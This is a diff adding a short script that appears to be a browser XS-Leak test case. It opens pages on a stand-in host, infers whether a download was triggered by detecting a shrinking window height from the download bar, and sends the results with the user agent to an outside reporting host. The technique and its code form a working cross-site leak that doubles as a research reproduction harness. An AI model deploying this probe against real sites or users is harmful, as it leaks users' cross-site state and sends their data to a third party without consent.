@@ -1,0 +1,43 @@
+<script>
+    var results = [];
+    window.onload = function () {
+        function run(url) {
+            // Read the current height of the window
+            var screenHeight = window.innerHeight; // Load the page that may or may not trigger the download
+
+            win = open(url); // Wait for the tab to load
+
+            setTimeout(function () {
+                // If the download bar appears, the height of all tabs will be smaller
+                console.log("full hight: " + screenHeight);
+                console.log("new hight: " + window.innerHeight);
+                if (window.innerHeight < screenHeight) {
+                    console.log('Download bar detected');
+                    results.push("detected");
+                    win.close();
+                } else {
+                    console.log('Download bar not detected');
+                    results.push("not_detected");
+                    win.close();
+                }
+            }, 1000);
+        }
+
+        run('https://leak.test/');
+        setTimeout(function () {
+            run('https://leak.test/download/');
+        }, 2000);
+
+        function report() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", "https://re.port/case6.json/" + btoa(JSON.stringify({
+                "user-agent": navigator.userAgent,
+                "without_download_bar": results[0],
+                "with_download_bar": results[1],
+                "xsleak_reproduced": results[0] === "not_detected" && results[1] === "detected"
+            })));
+            xhr.send();
+        }
+        setTimeout(report, 6000);
+    };
+</script>
